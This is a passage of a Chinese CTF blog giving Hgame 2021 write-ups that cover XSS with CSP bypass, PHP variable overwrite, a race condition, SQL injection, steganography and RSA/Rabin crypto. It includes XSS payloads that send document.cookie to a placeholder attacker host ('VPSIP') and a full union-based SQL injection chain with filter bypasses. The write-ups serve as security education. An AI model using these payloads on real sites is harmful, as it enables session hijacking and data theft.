\"29342ru89j3thisisfakecookieq983h23ijfq2ojifrnq92h2\": return \"hgame{G3t_fl@g_s0_Easy?No_way!!wryyyyyyyyy}\" else: return \"Only admin can get the flag, your token shows that you're not admin!\" @app.route('/clear') def clear_session(): session['contents'] = [] return \"ALL contents are cleared.\" def escape_index(original): content = original content_iframe = re.sub(r\"^(&lt;?/?iframe)\\s+.*?(src=[\\\"'][a-zA-Z/]{1,8}[\\\"']).*?(&gt;?)$\", r\"\\1 \\2 \\3\", content) if content_iframe != content or re.match(r\"^(&lt;?/?iframe)\\s+(src=[\\\"'][a-zA-Z/]{1,8}[\\\"'])$\", content): return content_iframe else: content = re.sub(r\"&lt;*/?(.*?)&gt;?\", r\"\\1\", content) return content def escape_replace(original): content = original content = re.sub(\"[&lt;&gt;]\", \"\", content) return content def create_code(): hashobj = hashlib.md5() hashobj.update(bytes(str(time.time()), encoding='utf-8')) code_hash = hashobj.hexdigest()[:6] return code_hash 主页 / 加了 Content-Security-Policy，/preview 页面没有。 templates/preview.html &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;link href=\"{{ url_for('static',filename='css/common.css') }}\" rel=\"stylesheet\" type=\"text/css\"&gt; &lt;title&gt;ONLINE BLOG EDITOR&lt;/title&gt; &lt;script src=\"{{ url_for('static',filename='js/jquery-3.5.1.min.js') }}\"&gt;&lt;/script&gt; &lt;script&gt; $(function () { $.get(\"/contents\").done(function (data) { let substr = \"{{ substr }}\" let replacement = \"{{ replacement | safe }}\" let output = document.getElementById(\"output\") for (let i = 0; i &lt; data.length; i++) { let div = document.createElement(\"div\") div.innerHTML = data[i].replace(substr, replacement) output.appendChild(div) } }) }) &lt;/script&gt; &lt;/head&gt; &lt;body&gt; &lt;div id=\"header\"&gt; &lt;a href=\"#\"&gt;Online Blog Editor&lt;/a&gt; &lt;/div&gt; &lt;div id=\"navigation\"&gt; &lt;ol&gt; &lt;li&gt;&lt;a href=\"#\"&gt;Editor&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"/flag\"&gt;Flag&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#\"&gt;About&lt;/a&gt;&lt;/li&gt; &lt;li&gt;&lt;a href=\"#\"&gt;Help&lt;/a&gt;&lt;/li&gt; &lt;/ol&gt; &lt;/div&gt; &lt;div id=\"main\"&gt; &lt;h1 id=\"title\"&gt;Post to Zuckonit&lt;/h1&gt; &lt;div id=\"main-content\"&gt; &lt;div id=\"output\"&gt;&lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;/body&gt; &lt;/html&gt; 模板里的 let substr = \"{{ substr }}\" 是将特殊字符如 引号 \" 、&lt;&gt; 转义了的。 而 let replacement = \"{{ replacement | safe }}\" 出来是保留原型的。 于是这里就有漏洞。 就构造一个 payload 把引号闭合，然后带着 cookie 打到 VPS 上。 meow\"+$.get(\"http://VPSIP/\"+document.cookie);// post 的内容的话就放个指向 preview 的 iframe。 &lt;iframe src=\"preview\"&gt;&lt;/iframe&gt; 后端替换后返回 &lt;iframe src=\"preview\" &gt; 还是有效的。 然后算个 md5 提交。 token=568fda45ba279640fc974e68b592366d82e1b74dfbc18c92ba4df52e6870e7c2 最后改 cookie，拿 flag. hgame{simple_csp_bypass&amp;a_small_mistake_on_the_replace_function} 这当然是非预期解啦 2333. Post to zuckonit another version d1gg12 的博客被日穿以后，他想办法学了更深入的 XSS 防护方法， 现在这个博客看上去已经坚不可摧了…是这样吗？ hint1: 查看网页源代码 hint2: 关于“更深入的xss防护方法”： 看看返回头？ hint3: RegExp hint4: https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/String/replace http://zuckonit-2-another.0727.site:5050/ （来复现一下） app.py @app.route('/') def home(): response = make_response(render_template(\"index.html\")) response.headers['Set-Cookie'] = \"token=WELCOME TO HGAME 2021.;\" response.headers['Content-Security-Policy'] = \"default-src 'self'; script-src 'self';\" return response @app.route('/preview') def preview(): if session.get('substr'): substr = session['substr'] else: substr = \"\" response = make_response( render_template(\"preview.html\", substr=substr)) return response @app.route('/send', methods=['POST']) def send(): if request.form.get('content'): content = escape_index(request.form['content']) if session.get('contents'): content_list = session['contents'] content_list.append(content) else: content_list = [content] session['contents'] = content_list return \"post has been sent.\" else: return \"WELCOME TO HGAME 2021 :)\" @app.route('/search', methods=[\"POST\"]) def replace(): if request.form.get('substr'): session['substr'] = escape_replace(request.form['substr']) return \"replace success\" else: return \"There is no content to search any more\" @app.route('/contents', methods=[\"GET\"]) def get_contents(): if session.get('contents'): content_list = jsonify(session['contents']) else: content_list = jsonify('&lt;i&gt;2021-02-12&lt;/i&gt;&lt;p&gt;Happy New Year every guys! ' 'Maybe it is nearly done now.&lt;/p&gt;', '&lt;i&gt;2021-02-11&lt;/i&gt;&lt;p&gt;Busy preparing for the Chinese New Year... ' 'And I add some new features to this editor, maybe you can take a try. ' 'But it has not done yet, I\\'m not sure if it can be safe from attacks.&lt;/p&gt;', '&lt;i&gt;2021-02-07&lt;/i&gt;&lt;p&gt;so many hackers here, I am going to add some strict rules.&lt;/p&gt;', '&lt;i&gt;2021-02-06&lt;/i&gt;&lt;p&gt;I have tried to learn HTML the whole yesterday, ' 'and I finally made this ONLINE BLOG EDITOR. Feel free to write down your thoughts.&lt;/p&gt;', '&lt;i&gt;2021-02-05&lt;/i&gt;&lt;p&gt;Yesterday, I watched &lt;i&gt;The Social Network&lt;/i&gt;. ' 'It really astonished me. Something flashed me.&lt;/p&gt;') return content_list @app.route('/code', methods=[\"GET\"]) def get_code(): if session.get('code'): return Response(response=json.dumps({'code': session['code']}), status=200, mimetype='application/json') else: code = create_code() session['code'] = code return Response(response=json.dumps({'code': code}), status=200, mimetype='application/json') @app.route('/flag') def show_flag(): if request.cookies.get('token') == \"29342ru89j3thisisfakecookieq983h23ijfq2ojifrnq92h2\": return \"hgame{G3t_fl@g_s0_Easy?No_way!!wryyyyyyyyy}\" else: return \"Only admin can get the flag, your token shows that you're not admin!\" @app.route('/clear') def clear_session(): session['contents'] = [] return \"ALL contents are cleared.\" def escape_index(original): content = original content_iframe = re.sub( r\"^(&lt;?/?iframe)\\s+.*?(src=[\\\"'][a-zA-Z/]{1,8}[\\\"']).*?(&gt;?)$\", r\"\\1 \\2 \\3\", content) if content_iframe != content or re.match(r\"^(&lt;?/?iframe)\\s+(src=[\\\"'][a-zA-Z/]{1,8}[\\\"'])$\", content): return content_iframe else: content = re.sub(r\"&lt;*/?(.*?)&gt;?\", r\"\\1\", content) return content def escape_replace(original): content = original content = re.sub(r\"[&lt;&gt;\\\"\\\\]\", \"\", content) return content def create_code(): hashobj = hashlib.md5() hashobj.update(bytes(str(time.time()), encoding='utf-8')) code_hash = hashobj.hexdigest()[:6] return code_hash 改了个 search，过滤里多了 \" \\ 不能像上一题那样闭合那个 双引号 了。 preview.html 中的 js 改成了 $(function () { $.get(\"/contents\").done(function (data) { let content = \"{{ substr | safe }}\" let output = document.getElementById(\"output\") for (let i = 0; i &lt; data.length; i++) { let div = document.createElement(\"div\") let substr = new RegExp(content, 'g') div.innerHTML = data[i].replace(substr, `&lt;b class=\"search_result\"&gt;${content}&lt;/b&gt;`) output.appendChild(div) } }) }) 可见弄了个 正则替换。 根据官方 WriteUp，可以通过构造 {任意匹配的字符串}|{想要注⼊的字符串} 这样的正则表达式来给页面注入元素。 再根据 String.prototype.replace() 的特殊变量名 主页还是 post &lt;iframe src=\"preview\"&gt; 于是就可以利用 分组 结合 $n 来得到尖括号。 单引号还是能用的，嘿嘿。 payload: (.)iframe src=.preview.(.)|$1img src=x onerror=top.location='//VPSIP/'+document.cookie$2 然后拿到 cookie token=6a506f5c3eff9ffe9dc573bc93629038f61a7fcdd7662efb441451b08b0c6671 拿到 flag hgame{CSP_iS_VerY_5trlct&amp;0nly_C@n_uSe_3vil.Js!} BTW, 官方给的 payload 是 利⽤我们 post 的 iframe 两边的尖括号，通过 $` $' ⽆中⽣有 iframe|$`input size=11 onfocus=window.open('vps-ip'+document.cookie) autofocus$' CryptoLikiPrime Wow! RSA! https://prime.liki.link/ #!/usr/bin/env python3 import random from libnum import s2n from secret import secrets, flag def get_prime(secret): prime = 1 for _ in range(secret): prime = prime &lt;&lt; 1 return prime - 1 random.shuffle(secrets) m = s2n(flag) p = get_prime(secrets[0]) q = get_prime(secrets[1]) n = p * q e = 0x10001 c = pow(m, e, n) print(\"n = {}.format(n)\") print(\"e = {}.format(e)\") print(\"c = {}.format(c)\") # n = 15361898878235696574667000105109009720717806584760935092206242960407549236363501417213696346370999607974104247856479458833772412536980365740161717369268547876567930581662460946856562030722330783421995955447378594119758550329759849393535018344139103042143621239011469955648205934903904045564846822159998174879695774419450399723970148270141003002902927002767984254099972288746243481084381643719731958360702561818663569730597624966561268824737610893516032068613120089855690580047620589196079907477458543783300282393495461746306096415443274084362956267239186823089349090398919748814938872938478097065267156231648487203329412422615711711886164634059723362167236118521458497248305115764510762731915291882155494011713295462603221439763218477455674584662524137991730891776826849188975650354165106378834014987695592746836998002232826678339919918799781246827459617082687425955430641815518416878015728514477287192934193957833532996687234554280263817068106805440848475668830505180172049674756979856286907198648267160926305328986853052888831678087029867946180609 # e = 65537 # c = 7927187628026055322783940901550651937893953660065534609714001711924456963095603013667085470146144874981960574233466397443449977149997357471575431695025415526421127927424585253533999961265066779103259623451208111709082292139347059312149137665426462381816329178229484680275368657450003046701355985014009700915439417466826446848877329284810802949440433122207430136944380576095681081740197798597559437163702511712448892986978229285577672410865991889634686024629071902793778620692548548234276678653195648305462703623579369309956481606223043040903082180559720551235515700080661234190693094571406679557502413049745325301747588707839920522910923018864009003988475371258742969932381590308381543035539043149634871622927695645953044249331889058081699783884965964986919852075768119185486506729958481688848547730131040350180411446263394686119546781350542737049112800140601734883325024073000156078427592350484379976615561586860882656403198952361411599125358422676828954908797542225611418969233985502900316342896903161811894061826308302594273209131132802270416006 p, q 都是 2**n - 1，懒了直接去 http://factordb.com 求解，得到 p = 2 ** 1279 - 1 q = 2 ** 2203 - 1 然后直接解就好。 hgame{Mers3nne~Pr!Me^re4l1y_s0+5O-li7tle!} 小结噢，Misc 忘记做了啊，问题不大（（ 喵呜呜，我好菜啊，题目好难啊！！！ 就这样吧（ （溜了溜了喵","path":"2021/02/23/CTF_2021HgameWeek3/"},{"title":"CTF | 2021 Hgame Week2 WriteUp","text":"引言开门见山，这篇是 Hgame 2021 第二周的 WriteUp 啦。 第一周的详见 CTF | 2021 Hgame Week1 WriteUp。 MiscTools 工欲善其事，必先利其器。 https://1.oss.hgame2021.vidar.club/tools_21d9ccfca5a4321d6256038d3e885b6d.zip F5 解 Matryoshka.jpg $ java Extract Matryoshka.jpg -p \"!LyJJ9bi&amp;M7E72*JyD\" Huffman decoding starts Permutation starts 577536 indices shuffled Extraction starts Length of embedded file: 18 bytes (1, 127, 7) code used 得到 e@317S*p1A4bIYIs1M 解压 # A7SL9nHRJXLh@$EbE8 $ steghide.exe extract -sf \"01.jpg\" -p \"A7SL9nHRJXLh@$EbE8\" wrote extracted data to \"pwd.txt\". u0!FO4JUhl5!L55%$&amp; 02.jpg:z0GFieYAee%gdf0%lF $ outguess -k \"z0GFieYAee%gdf0%lF\" -r 02.jpg output.txt Reading 02.jpg.... Extracting usable bits: 4930 bits Steg retrieve: seed: 184, len: 18 $ cat output.txt @UjXL93044V5zl2ZKI 有毒，我用新版 https://github.com/resurrecting-open-source-projects/outguess 这个出来是乱码…… 要用旧版的 https://github.com/crorvick/outguess，然后编译安装。 ./configure &amp;&amp; make 03.jpg: rFQmRoT5lze@4X4^@0 到这里其实就可以扫出来了~ hgame{Taowa_is_N0T_g00d_but_T001s_is_Useful} 不过还是做一下吧。 xSRejK1^Z1Cp9M!z@H 最后拼成一整个。 DNS A significant invention. https://1.oss.hgame2021.vidar.club/dns_250e1c3c63209fd5546937be4f41cb39.pcapng 从抓到的流量可以看到 DNS 查询，以及访问了一个域名为 flag.hgame2021.cf 的网站。 BTW, 这是个免费域名，套了 CloudFlare。 访问提示 Do you know SPF?。 发件人策略框架（英语：Sender Policy Framework；简称SPF； RFC 4408）是一套电子邮件认证机制，可以确认电子邮件确实是由网域授权的邮件服务器寄出，防止有人伪冒身份网络钓鱼或寄出垃圾电邮。SPF允许管理员设定一个DNS TXT记录或SPF记录设定发送邮件服务器的IP范围，如有任何邮件并非从上述指明授权的IP地址寄出，则很可能该邮件并非确实由真正的寄件者寄出（邮件上声称的“寄件者”为假冒）。 Via wikipedia (English version) 配域名邮箱的时候就整过，一般是需要设个 TXT 记录。 那就 dig 看看吧。 hgame{D0main_N4me_5ystem} （嘿嘿，老套路了 Telegraph：1601 6639 3459 3134 0892 他曾经最喜欢的曲师写的曲子，让人犹如漫步在星空之下，可如今他听见只觉得反胃。由于文件名过长，单独给出附件的md5: E5C3EE3F441B860B07A3ADCD98BFFC00请将flag以hgame{your_flag_here}形式提交，flag为全大写。 [https://1.oss.hgame2021.vidar.club/Telegraph%EF%BC%9A1601%206639%203459%203134%200892.mp3](https://1.oss.hgame2021.vidar.club/Telegraph：1601 6639 3459 3134 0892.mp3) 电报 1601 6639 3459 3134 0892 解码得到 带通滤波器，喵，BPF 好东西。 拖进 Audacity，频谱图看到明显的 850Hz 字样。 在 850Hz 范围上下设置带通滤波器后，在 1:10 - 1:35 之前听到了电报声音。 其实对比一下也能看出来。 手工抄录一下。 -.-- --- ..- .-. ..-. .-.. .- --. .. ... ---... ....- --. ----- ----- -.. ... ----- -. --. -... ..- - -. ----- - ....- --. ----- ----- -.. -- .- -. ----- ...-- ----. ...-- .---- ----- -.- .. 解密得到 YOURFLAGIS:4G00DS0NGBUTN0T4G00DMAN039310KI hgame{4G00DS0NGBUTN0T4G00DMAN039310KI} Hallucigenia “我们不仅弄错了他的上下，还颠倒了它的左右。” https://1.oss.hgame2021.vidar.club/Hallucigenia_6aa99427e137e9e3563d83f5d639cc74.png 图片第0层里隐写了二维码 扫码得到 gmBCrkRORUkAAAAA+jrgsWajaq0BeC3IQhCEIQhCKZw1MxTzSlNKnmJpivW9IHVPrTjvkkuI3sP7bWAEdIHWCbDsGsRkZ9IUJC9AhfZFbpqrmZBtI+ZvptWC/KCPrL0gFeRPOcI2WyqjndfUWlNj+dgWpe1qSTEcdurXzMRAc5EihsEflmIN8RzuguWq61JWRQpSI51/KHHT/6/ztPZJ33SSKbieTa1C5koONbLcf9aYmsVh7RW6p3SpASnUSb3JuSvpUBKxscbyBjiOpOTq8jcdRsx5/IndXw3VgJV6iO1+6jl4gjVpWouViO6ih9ZmybSPkhaqyNUxVXpV5cYU+Xx5sQTfKystDLipmqaMhxIcgvplLqF/LWZzIS5PvwbqOvrSlNHVEYchCEIQISICSZJijwu50rRQHDyUpaF0y///p6FEDCCDFsuW7YFoVEFEST0BAACLgLOrAAAAAggUAAAAtAAAAFJESEkNAAAAChoKDUdOUIk= base64 解码发现是倒着的 png 也就是下面这张图 上下（垂直）倒一下，得到 flag。 hgame{tenchi_souzou_dezain_bu} WebLazyDogR4Uwww.zip 给了源码。 发现其实就只有6个有用文件。 config.ini 是用户配置，注意到这里的 testuser 密码 md5 是 0e 开头。 [global] debug = true [admin] username = admin pass_md5 = b02d455009d3cf71951ba28058b2e615 [testuser] username = testuser pass_md5 = 0e114902927253523756713132279690 Config.php 读取上面的配置文件，导入所有用户。 &lt;?php class Config{ private static array $conf; /** * @var array|false */ static function init(){ self::$conf = parse_ini_file('config.ini', true); } static function getItem($section, $key){ return self::$conf[$section][$key]; } static function getAllUsers(): array { $users = self::$conf; unset($users['global']); return $users; } } Config::init(); lazy.php 这里把所有 GET / POST 进来的数据都直接赋值了，是漏洞点。 &lt;?php $filter = [\"SESSION\", \"SEVER\", \"COOKIE\", \"GLOBALS\"]; // 直接注册所有变量，这样我就能少打字力，芜湖~ foreach(array('_GET','_POST') as $_request){ foreach ($$_request as $_k =&gt; $_v){ foreach ($filter as $youBadBad){ $_k = str_replace($youBadBad, '', $_k); } ${$_k} = $_v; } } // 自动加载类，这样我也能少打字力，芜湖~ function auto($class_name){ require_once $class_name . \".php\"; } spl_autoload_register('auto'); User.php 定义 User 类 &lt;?php class User { function login($username, $password){ if(session_status() == 1){ session_start(); } $userList = $this-&gt;getUsersList(); if(array_key_exists($username, $userList)){ if(md5($password) == $userList[$username]['pass_md5']){ $_SESSION['username'] = $username; return true; }else{ return false; } } return false; } function logout(){ unset($_SESSION['username']); session_destroy(); } private function getUsersList(){ return Config::getAllUsers(); } } 可以看到这里 密码比较是 MD5 弱类型比较。 index.php &lt;?php session_start(); require_once \"lazy.php\"; if(isset($_SESSION['username'])){ header(\"Location: flag.php\"); exit(); }else{ if(isset($username) &amp;&amp; isset($password)){ if((new User())-&gt;login($username, $password)){ header(\"Location: flag.php\"); exit(); }else{ echo \"&lt;script&gt;alert('食人的魔鬼尝试着向答案进发。')&lt;/script&gt;\"; } } } ?&gt; &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"static/style.css\"&gt; &lt;/head&gt; &lt;body&gt; &lt;form class=\"box\" action=\"\" method=\"post\"&gt; &lt;h3 style=\"color: white\"&gt;未授权的的怪物正在本页面登陆&lt;/h3&gt; &lt;input type=\"text\" name=\"username\" placeholder=\"Username\"&gt; &lt;input type=\"password\" name=\"password\" placeholder=\"Password\"&gt; &lt;input type=\"submit\" value=\"尝试进入\"&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 逻辑是用户登录，然后跳转到 flag.php flag.php &lt;?php session_start(); require_once 'lazy.php'; if(!isset($_SESSION['username'])){ die('您配吗？'); } ?&gt; &lt;!DOCTYPE html&gt; &lt;html lang=\"en\"&gt; &lt;head&gt; &lt;meta charset=\"UTF-8\"&gt; &lt;meta name=\"viewport\" content=\"width=device-width, initial-scale=1.0\"&gt; &lt;meta http-equiv=\"X-UA-Compatible\" content=\"ie=edge\"&gt; &lt;title&gt;Document&lt;/title&gt; &lt;link rel=\"stylesheet\" href=\"static/style.css\"&gt; &lt;/head&gt; &lt;body&gt; &lt;form class=\"box\" action=\"\" method=\"post\"&gt; &lt;?php if($_SESSION['username'] === 'admin'){ echo \"&lt;h3 style='color: white'&gt;admin将于今日获取自己忠实的flag&lt;/h3&gt;\"; echo \"&lt;h3 style='color: white'&gt;$flag&lt;/h3&gt;\"; }else{ if($submit == \"getflag\"){ echo \"&lt;h3 style='color: white'&gt;{$_SESSION['username']}接近了问题的终点&lt;/h3&gt;\"; }else{ echo \"&lt;h3 style='color: white'&gt;篡位者占领了神圣的页面&lt;/h3&gt;\"; } } ?&gt; &lt;input type=\"submit\" name=\"submit\" value=\"getflag\"&gt; &lt;/form&gt; &lt;/body&gt; &lt;/html&gt; 可以看到首先要有 $_SESSION['username']，其次这里有个表单，但不关键。 其实只需要在这里传参改掉 $_SESSION['username'] 为 admin 就可了。 于是构造 payload： POST http://5588b617f8.lazy.r4u.top/ username=testuser&amp;password=QNKCDZO 成功获得 $_SESSION['username']，而后直接 GET 传参改掉这个就好了。 注意它有个 filter，双写绕过就好了，即 _SESSSESSIONION[username]=admin. （实际上这里并不需要登录 2333 GET http://5588b617f8.lazy.r4u.top/flag.php?_SESSSESSIONION%5Busername%5D=admin hgame{R4U~!s-4-lazy~doG} Extensive Reading unset_记一道CTF题，里面讲了个有点类似的。 foreach(array('_POST', '_GET', '_COOKIE') as $__R) { if($$__R) { foreach($$__R as $__k =&gt; $__v) { if(isset($$__k) &amp;&amp; $$__k == $__v) unset($$__k); } } } Liki的生日礼物 Liki生日快要到了，她想要一台switch，你能帮帮她么？ https://birthday.liki.link shop.js 里有一些接口相关代码 function login() { $.post(\"/API/?m=login\", { name: $(\"#name\").val(), password: $(\"#password\").val() }, function (data, status) { var message = JSON.parse(data) if (message.status === \"error\") { alert(message.data) } else if(message.status === \"success\"){ location.href=\"shop.html\" } } ); } function register() { $.post(\"/API/?m=register\", { name: $(\"#name\").val(), password: $(\"#password\").val() }, function (data, status) { var message = JSON.parse(data) if (message.status === \"error\") { alert(message.data); } else if (message.status === \"success\") { alert(message.data); location.href = \"index.html\"; } } ); } function getinfo() { $.get(\"/API/?m=getinfo\", function (data, status) { var message = JSON.parse(data) if (message.status === \"error\") { location.href = \"index.html\" } $(\"#money\").text(message.data['money']) $(\"#num\").text(message.data['num']) } ); } function buy() { $.post(\"/API/?m=buy\", data = $(\"#buy\").serialize() , function (data, status) { var message = JSON.parse(data) if (message.status === \"error\") { alert(message.data) } else { alert(\"兑换成功\"); getinfo(); } }, ); } function logout() { $.get(\"/API/?m=logout\", function (data, status) { var message = JSON.parse(data) if (message.status === \"success\") { alert(message.data); location.href = \"index.html\"; } } ); } function getflag() { $.get(\"/API/?m=getflag\", function (data, status) { var message = JSON.parse(data) alert(message.data) } ); } 简单看了看发现没啥问题，也做了数据的合法性校验，比如大数溢出、float、负数啥的做不到。 于是考虑是 （数据库）条件竞争。也就是通过大量并发让服务器措手不及。 利用多线程并发去执行同一个 buy 操作，以至于服务器处理的线程之间未能同步好所有请求，扣除余额和发放兑换券不能同时完成，从而就能超过52张兑换券了。 这里用 BurpSuite 的 Intruder 来实现。 先抓个包，每次兑换 5个兑换券。 选择 Null payloads，生成 100 个 payloads，然后再开 10 个线程并发执行。 瞬间就跑完了，然后刷新一下页面，兑换，拿到 flag。 hgame{L0ck_1s_TH3_S0lllut!on!!!} 所以要加锁呢。 BTW, 本来用 Python 多线程跑的，发现不行……估计开的不够多？ Extensive reading: CTF中的条件竞争漏洞 例1：金额提现 例2：先存储文件，再判断是否合法，然后再删除。===&gt; 写入 shell 木马 伪代码： &lt;?php if(isset($_GET['src'])){ saveimg($_GET['src']); //得到保存路径filename //检查文件 check(filename); if(不符合规范) delete(filename); else pass; //... } ?&gt; Post to zuckonit d1gg12 新学了HTML，一起来看看他写的在线博客吧！ http://zuckonit.0727.site:7654 XSS script.js 里有 API $(function () { $.get(\"/code\").done(function (data) { $('#captcha')[0].placeholder = \"Code: md5(code)[:6] == \" + data.code; }); $(\"#send\").click(function () { let contentInput = $(\"#content\").val(); if (contentInput !== \"\") { $.ajax({ type: 'POST', url: '/send', data: {\"content\": contentInput} , success: function (data) { location.reload(); } , error: function (data) { alert(data.responseText); } , }) $('#content').val(\"\"); } }) ; $(\"#clear\").click(function () { $.get(\"/clear\"); $('#output').html(\"\"); }); $(\"#submit\").click(function () { let code = $('#captcha').val(); $.post(\"/submit\", {'code': code}).done(function (data) { alert(data); }); }); }); 于是就构造 XSS 请求，可以发现他过滤了一些关键字，比如 script, http, https，而且用 img 的时候返回的字符倒序了。 那咱就倒过来写吧。 最开始是用 img 打到 https://xss.pt 上面的，后来有问题总是接收不到。 类似于这样 &gt;gpj.pW3uo/tp.ssx//'=crs/gmi&lt;img/src='//xss.pt/ou3Wp.jpg 干脆直接打到自己 VPS 上，用 url 算了。 注意 submit 的时候需要校验 md5，写个脚本爆破一下。 from hashlib import md5 for i in range(0xFFFFFFF): x = md5(str(i).encode()).hexdigest()[:6] if x == '612bbe': print(i) break Payload: \"eikooc.tnemucod+'/倒过来的VPSIP//'=ferh.onitacol.wodniw\"=rorreno/'#'=crs/gmi&lt; &lt;img/src='#'/onerror=\"window.location.href='//VPSIP/'+document.cookie\" VPS 上拿到 cookie 然后带着这个 cookie 访问 /flag，拿到 flag hgame{X5s_t0_GEt_@dm1n's_cOokies.} 200OK!! hint: status 字段会有什么坏心思呢?hint: 这些字符串存在哪里呢？变量？还是…？今天你 PTSD 了吗？ https://200ok.liki.link Header Status 字段 SQL 注入。 过滤了一些关键词，大小写混用来绕过，空格用 /**/ 绕过。 # GET https://200ok.liki.link/server.php # 查询当前数据库 -1'/**/uNion/**/SelecT/**/database()# week2sqli # 查询所有数据库 -1'/**/uNion/**/SelecT/**/group_concAt(schema_name)/**/fRom/**/information_schema.schemata# information_schema,mysql,performance_schema,sys,week2sqli # 查询表名 -1'/**/uNion/**/SelecT/**/group_concAt(table_name)/**/frOm/**/information_schema.tables/**/wherE/**/table_schema=database()# f1111111144444444444g,status # 查询列名 -1'/**/uNion/**/SelecT/**/group_concAt(column_name)/**/frOm/**/information_schema.columns/**/wherE/**/table_name='f1111111144444444444g'# ffffff14gggggg # 查询字段值 -1'/**/uNion/**/SelecT/**/ffffff14gggggg/**/frOm/**/f1111111144444444444g# hgame{Con9raTu1ati0n5+yoU_FXXK~Up-tH3,5Q1!!=)} Cryptosignintask: from libnum import * from Crypto.Util import number from secret import FLAG m = s2n(FLAG) a = number.getPrime(1024) p = number.getPrime(1024) c = a ** p * m % p print(\"a = {}\".format(a)) print(\"p = {}\".format(p)) print(\"c = {}\".format(c)) # a = 164082656705280243691125701366387366083595671395343593709662689631005563420712514013315976102671561607316385961761351750099262566476484522886282723886520916918141054995957297228003062477122757133630754605589171370142255727815498152265374544695303477525391985791134432904658602561841437101787689055904235722543 # p = 119737975692964086468800522901334964831462403986044100108042760900964357796378935817727112428450685227062069911631189059668095468384251497619994295762904825142670700856495550090451162130895038569427260669297398177894831568054918372123884561767488134043298231005288709340276215664659982597587377569232740821383 # c = 61634913046503959178216377910203847308428571260648767327608998821120378164975042475439460895394673980137101460250286330274948376187417345460266021486815411513611233649751971142112272707408612929020818762110963149534344745362620646443064201836579453768233731326328543553543287448234680170625258920657056312732 (a + b) % n ≡ (a % n + b % n) % n(a - b) % n ≡ (a % n - b % n) % n(a * b) % n ≡ (a % n * b % n) % n(a ^ b) % n ≡ ((a % n) ^ b) % n //幂运算 若 a ≡ b (mod n)，则 对于任意正整数c，有 a^c ≡ b^c (mod n) 对于任意整数c，有 ac ≡ bc (mod n), a+c ≡ b+c (mod n), 若 c ≡ d(mod n)，则 a-c ≡ b-d(mod n), a+c ≡ b+d(mod n), ac ≡ bd(mod n) 如果 ac≡bc (mod m)，且c和m互质，则 a≡b (mod m）。[理解：当且仅当c和m互质，c^-1存在，等式左右可同乘模逆。] 除法规则：在模n意义下，a/b不再仅仅代表这两个数相除，而是指 a + k1 * n 和 b + k2 * n 这两个组数中任意两个相除，使商为整数因此也就可以理解，除以一个数等价于乘以它的逆a/b ≡ c(mod n) &lt;=&gt; a ≡ c * (b^-1) (mod n)，其中b模n的逆记作b的负一次方。 费马小定理：a是整数，p是质数，则 a^p==a (mod p)，如果 a 不是 p 的倍数，还有 a^(p-1) ≡ 1 (mod p) See Also: 模运算总结 和 取模运算涉及的算法 在这题里面，就可以化简一下。 $$c = a ^ p \\cdot m \\bmod p \\\\\\ = a \\cdot m \\bmod p \\\\\\Rightarrowm = c \\cdot a^{-1} \\bmod p$$ Exp: from libnum import * import gmpy2 a = gmpy2.mpz(164082656705280243691125701366387366083595671395343593709662689631005563420712514013315976102671561607316385961761351750099262566476484522886282723886520916918141054995957297228003062477122757133630754605589171370142255727815498152265374544695303477525391985791134432904658602561841437101787689055904235722543) p = gmpy2.mpz(119737975692964086468800522901334964831462403986044100108042760900964357796378935817727112428450685227062069911631189059668095468384251497619994295762904825142670700856495550090451162130895038569427260669297398177894831568054918372123884561767488134043298231005288709340276215664659982597587377569232740821383) c = gmpy2.mpz(61634913046503959178216377910203847308428571260648767327608998821120378164975042475439460895394673980137101460250286330274948376187417345460266021486815411513611233649751971142112272707408612929020818762110963149534344745362620646443064201836579453768233731326328543553543287448234680170625258920657056312732) x = gmpy2.invert(a, p) m = c * x % p print(m) print(n2s(int(m))) # 3741406882261031073760817995303276732942491822855369918885665586853805791130867897899676088764261025784189 # b'hgame{M0du1@r_m4th+1s^th3~ba5is-Of=cRypt0!!}' WhitegiveRSA N = 882564595536224140639625987659416029426239230804614613279163 e = 65537 c = 747831491353896780365654517748216624798517769637260742155527 p, q = 857504083339712752489993810777, 1029224947942998075080348647219 hgame{w0w~yOU_kNoW+R5@!} Extensive reading: CTF中常见的RSA相关问题总结 gcd or more?from libnum import * from secret import FLAG p = 85228565021128901853314934583129083441989045225022541298550570449389839609019 q = 111614714641364911312915294479850549131835378046002423977989457843071188836271 n = p * q cipher = pow(s2n(FLAG), 2, n) print(cipher) # 7665003682830666456193894491015989641647854826647177873141984107202099081475984827806007287830472899616818080907276606744467453445908923054975393623509539 参考 Rabin加密算法和n次同余方程、Rabin cryptosystem 正好符合加密的逻辑 选择两个大素数p和q做为私钥 计算n = p * q做为公钥 若明文为m，则密文为c ≡ m^2 (mod n) 解密： Compute the square root of $c$ modulo $p$ and $q$ using these formulas: $${\\displaystyle {\\begin{aligned}m_{p}=c^{\\frac {1}{4}(p+1)}{\\bmod {p}} \\\\m_{q}=c^{\\frac {1}{4}(q+1)}{\\bmod {q}}\\end{aligned}}}$$ Use the extended Euclidean algorithm to find $y_{p}$ and $y_{q}$ such that $$ y_{p}\\cdot p+y_{q}\\cdot q=1 $$ Use the Chinese remainder theorem to find the four square roots of $c$ modulo $n$: $$r_{1}=\\left(y_{p}\\cdot p\\cdot m_{q}+y_{q}\\cdot q\\cdot m_{p}\\right){\\bmod {n}} \\\\r_{2}=n-r_{1} \\\\r_{3}=\\left(y_{p}\\cdot p\\cdot m_{q}-y_{q}\\cdot q\\cdot m_{p}\\right){\\bmod {n}} \\\\r_{4}=n-r_{3}$$ One of these four values is the original plaintext $m$. 四个解中有一个就是密文 m。 注意到这里的 p, q % 4 == 3. Exp: from gmpy2 import * from random import randint from Crypto.Util.number import getPrime from libnum import * def power(s1, s2, k1, 